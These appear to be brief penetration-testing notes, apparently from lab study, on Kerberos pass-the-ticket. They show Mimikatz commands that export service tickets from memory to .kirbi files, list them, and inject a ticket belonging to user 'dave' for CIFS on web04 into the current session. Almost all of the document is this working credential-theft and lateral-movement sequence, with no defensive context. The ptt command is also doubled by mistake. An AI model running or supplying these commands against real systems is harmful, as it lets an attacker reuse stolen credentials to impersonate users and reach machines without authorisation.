TGS can be exported and reused across systems
abuse TGS

exporting kerberos TGS to disk
```
privilege::debug
sekurlsa::tickets /export
exit
```

listing exported TGSs
```
dir *.kirbi
```

injecting the selected TGS into process memory
```
kerberos::ptt kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```